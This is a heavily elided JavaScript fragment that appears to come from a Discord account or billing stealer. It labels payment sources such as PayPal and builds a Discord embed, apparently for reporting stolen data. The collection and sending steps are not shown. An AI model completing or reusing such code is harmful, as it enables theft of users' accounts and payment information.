...
const config = {
  ...
  embed_icon: 'https://media.discordapp.net/attachments/988838555025551420/994207902191599687/4c1d991589671e1e3ebf10621de0d9c5.png',
  embed_color: 000000, 
    ...
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          ...
          break;
        case 2:
          billing += '<:paypal123:995118551046308040> ';
          break;
      }
    }
  });
    ...
    embeds: [
      {
        ...
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/988838555025551420/994207902191599687/4c1d991589671e1e3ebf10621de0d9c5.png',
        },
      },
    ],
  };
